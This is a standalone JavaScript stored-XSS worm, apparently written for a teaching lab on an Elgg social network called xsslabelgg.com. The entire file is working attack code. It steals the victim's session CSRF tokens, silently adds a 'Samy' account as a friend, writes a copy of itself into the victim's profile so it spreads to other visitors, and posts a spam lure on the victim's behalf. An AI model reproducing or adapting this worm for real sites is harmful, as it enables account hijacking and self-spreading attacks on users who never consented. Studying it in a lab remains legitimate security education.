<script type="text/javascript" id="worm">

    window.onload = function () 
    {
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the HTTP request to add Samy as a friend.

        var samyID = 47;
        var ownerID = elgg.session.user.guid;

    
        if(samyID != ownerID)
        {
             	var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=" + samyID + ts +  token +  ts +  token;

        	//Create and send Ajax request to add friend
        	Ajax=new XMLHttpRequest();
        	Ajax.open("GET",sendurl,true);
        	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        	Ajax.send();
        }




        var sendurl = "http://www.xsslabelgg.com/action/profile/edit";

        var guid = "&guid=" + elgg.session.user.guid;
	var name = "&name="+elgg.session.user.name;

        //content = token + ts + name;
        var description = "&description=" + wormCode;
        var content = token + ts + name + description + guid;
	
	if(samyID != ownerID)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}





        var sendurl = "http://www.xsslabelgg.com/action/thewire/add";

        var body = "&body=To earn 12 USD/Hour(!), visit now " + "http://www.xsslabelgg.com/profile/samy";

        var content = token + ts + body;
	
	if(samyID != ownerID)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}

    }
    
</script>
